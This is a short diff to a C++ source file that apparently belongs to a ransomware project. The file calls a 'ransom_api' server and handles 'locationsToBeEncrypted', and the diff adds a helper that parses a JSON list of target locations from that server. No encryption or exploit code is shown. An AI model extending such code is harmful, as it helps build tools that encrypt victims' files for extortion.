@@ -3,6 +3,7 @@
 #include <sstream>
 #include "headers/HTTPRequest.hpp"
 #include "headers/ransomFunctions.h"
+#include "headers/json.hpp"
 
 
 //Function to read locations and push them into a vector.
@@ -60,8 +61,6 @@ std::string get_request(std::string uri){
 
 
 
-
-
 //Delete request to ransom_api.
 std::string delete_request(std::string id){
       try{
@@ -80,7 +79,6 @@ std::string delete_request(std::string id){
         
     } 
 }
-
 
 
 
@@ -122,4 +120,13 @@ void locationsMinusServerLocations(std::vector<std::string>& locationsToBeEncryp
         }
 
 
+}
+
+std::vector<std::string> jsonToStringVector(nlohmann::json& j_complete){
+    std::vector<std::string> tempVector;
+    for(int i = 0; i < j_complete["locations"].size(); i++){
+        tempVector.push_back(j_complete["locations"][i]["location"]);
     }
+
+    return tempVector;
+}
